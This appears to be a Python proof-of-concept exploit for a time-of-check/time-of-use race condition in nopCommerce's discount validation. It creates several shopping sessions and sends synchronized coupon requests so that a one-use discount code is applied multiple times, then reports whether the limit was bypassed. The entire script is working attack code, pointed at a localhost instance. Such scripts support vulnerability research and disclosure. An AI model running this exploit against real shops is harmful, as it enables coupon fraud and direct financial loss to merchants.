#!/usr/bin/env python3
"""
Race Condition PoC for nopCommerce Discount System

This script tests the TOCTOU race condition in discount usage validation.
The vulnerability exists between:
- DiscountService.cs:556 (Check usage count)
- OrderProcessingService.cs:1440 (Record usage history)
"""

import requests
import threading
import time
import re
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://localhost:8080"
DISCOUNT_CODE = sys.argv[1] if len(sys.argv) > 1 else "123"
NUM_THREADS = 5


def get_csrf_token(session, url):
    """Extract CSRF token from page"""
    response = session.get(url)
    match = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', response.text)
    return match.group(1) if match else ""


def create_session_with_cart():
    """Create a session and add a product to cart"""
    session = requests.Session()

    # Get homepage to establish session
    response = session.get(BASE_URL)

    # Find a product to add to cart
    product_match = re.search(r'href="(/[^"]*)" class="product-title"', response.text)
    if not product_match:
        # Try alternative pattern
        product_match = re.search(r'data-productid="(\d+)"', response.text)
        if product_match:
            product_id = product_match.group(1)
            # Add to cart directly
            add_url = f"{BASE_URL}/addproducttocart/catalog/{product_id}/1/1"
            session.post(add_url)
            return session

    if product_match:
        product_url = BASE_URL + product_match.group(1)
        product_page = session.get(product_url)

        # Find add to cart form
        pid_match = re.search(r'data-productid="(\d+)"', product_page.text)
        if pid_match:
            product_id = pid_match.group(1)
            token = get_csrf_token(session, product_url)

            add_url = f"{BASE_URL}/addproducttocart/details/{product_id}/1"
            session.post(add_url, data={
                "__RequestVerificationToken": token,
                f"addtocart_{product_id}.EnteredQuantity": "1"
            })

    return session


def apply_discount(session, thread_id, barrier, results):
    """Apply discount code - synchronized with barrier"""
    try:
        # Go to cart page
        cart_url = f"{BASE_URL}/cart"
        cart_page = session.get(cart_url)
        token = get_csrf_token(session, cart_url)

        # Wait at barrier for synchronized start
        print(f"[Thread {thread_id}] Ready, waiting at barrier...")
        barrier.wait()

        # Send discount application request
        start_time = time.time()
        response = session.post(cart_url, data={
            "__RequestVerificationToken": token,
            "discountcouponcode": DISCOUNT_CODE,
            "applydiscountcouponcode": "Apply coupon"
        })
        elapsed_ms = (time.time() - start_time) * 1000

        # Analyze response
        success = False
        message = "Unknown"

        if "applied" in response.text.lower() or "Applied" in response.text:
            success = True
            message = "Discount applied successfully"
        elif "cannot be used" in response.text.lower():
            message = "Discount limit reached"
        elif "wrong" in response.text.lower() or "invalid" in response.text.lower():
            message = "Invalid discount code"
        elif "discount" in response.text.lower():
            # Check for discount-related message
            match = re.search(r'<li[^>]*>([^<]*discount[^<]*)</li>', response.text, re.IGNORECASE)
            if match:
                message = match.group(1).strip()
                success = "applied" in message.lower()

        results[thread_id] = {
            "success": success,
            "message": message,
            "status_code": response.status_code,
            "elapsed_ms": elapsed_ms
        }

        status = "SUCCESS" if success else "FAILED"
        print(f"[Thread {thread_id}] {status} - {message} ({elapsed_ms:.2f}ms)")

    except Exception as e:
        results[thread_id] = {
            "success": False,
            "message": str(e),
            "status_code": 0,
            "elapsed_ms": 0
        }
        print(f"[Thread {thread_id}] ERROR - {str(e)}")


def main():
    print("=" * 60)
    print("nopCommerce Discount Race Condition PoC")
    print("=" * 60)
    print(f"Target: {BASE_URL}")
    print(f"Discount Code: {DISCOUNT_CODE}")
    print(f"Concurrent Threads: {NUM_THREADS}")
    print("=" * 60)
    print()

    # Create sessions with products in cart
    print("[*] Creating sessions and adding products to cart...")
    sessions = []
    for i in range(NUM_THREADS):
        session = create_session_with_cart()
        sessions.append(session)
        print(f"    Session {i+1} created")

    print()
    print("[*] Launching synchronized discount applications...")
    print()

    # Create barrier for synchronized start
    barrier = threading.Barrier(NUM_THREADS)
    results = {}
    threads = []

    # Start all threads
    for i, session in enumerate(sessions):
        t = threading.Thread(target=apply_discount, args=(session, i, barrier, results))
        threads.append(t)
        t.start()

    # Wait for all threads to complete
    for t in threads:
        t.join()

    # Analyze results
    print()
    print("=" * 60)
    print("RESULTS SUMMARY")
    print("=" * 60)

    success_count = sum(1 for r in results.values() if r.get("success"))
    total_count = len(results)

    print(f"Total Requests: {total_count}")
    print(f"Successful Discount Applications: {success_count}")
    print(f"Discount Limit Setting: 1")
    print()

    print("Detailed Results:")
    for tid in sorted(results.keys()):
        r = results[tid]
        status = "SUCCESS" if r["success"] else "FAILED"
        print(f"  Thread {tid}: [{status}] {r['message']} - {r['elapsed_ms']:.2f}ms")

    print()
    print("=" * 60)

    if success_count > 1:
        print("VULNERABILITY CONFIRMED!")
        print(f"Discount was applied {success_count} times (limit: 1)")
        print()
        print("This confirms the TOCTOU race condition:")
        print("1. Multiple threads passed the usage count check")
        print("2. Before any usage history was recorded")
        print("3. All threads successfully applied the discount")
    elif success_count == 1:
        print("NORMAL BEHAVIOR")
        print("Only 1 discount application succeeded (as expected)")
        print("Race condition may exist but was not exploited in this run.")
        print("Try increasing thread count or run multiple times.")
    else:
        print("TEST INCONCLUSIVE")
        print("No successful discount applications.")
        print("Check if discount code is valid and products are in cart.")

    print("=" * 60)

    return success_count


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success > 1 else 1)
